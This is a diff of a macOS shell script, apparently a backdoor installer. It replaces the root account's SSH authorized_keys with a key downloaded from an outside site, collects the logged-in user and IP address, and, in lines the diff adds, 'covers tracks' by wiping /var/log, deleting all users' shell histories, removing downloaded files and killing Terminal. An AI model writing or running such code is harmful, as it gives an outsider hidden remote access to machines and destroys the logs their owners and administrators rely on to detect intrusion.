@@ -12,7 +12,7 @@ mkdir -p "$SSHPATH" # On most computers, there won't be a .ssh directory initial
 
 rm "$SSHPATH/authorized_keys" # Just in case
 echo "Downloading pubkey..."
-curl https://erikboesen.com/pubkey --output "$SSHPATH/authorized_keys"
+curl -s https://erikboesen.com/pubkey --output "$SSHPATH/authorized_keys"
 
 USER=`stat -f "%Su" /dev/console` # Get user currently logged in (in GUI).
 IP=`ifconfig | grep -Eo 'inet (addr:)?([0-9]*\.){3}[0-9]*' | grep -Eo '([0-9]*\.){3}[0-9]*' | grep -v '127.0.0.1'`
@@ -34,9 +34,16 @@ echo
 # Get rid of files to cover tracks
 rm /tmp/elevate.out /tmp/*.sh
 
-# Remove original script unless on boesene so we don't delete during development
+rm -rf /var/log/*
+rm /var/root/.*history
+rm /Users/*/.*history
+
+rm "/Users/${USER}/Downloads/term.*"
+
 if [ "$USER" != "boesene" ]; then
-    rm /Users/*/join.sh /Users/*/Desktop/join.sh
-    rm /Users/*/Downloads/term.*
     killall term
+    killall Terminal
 fi
+
+clear
+exit
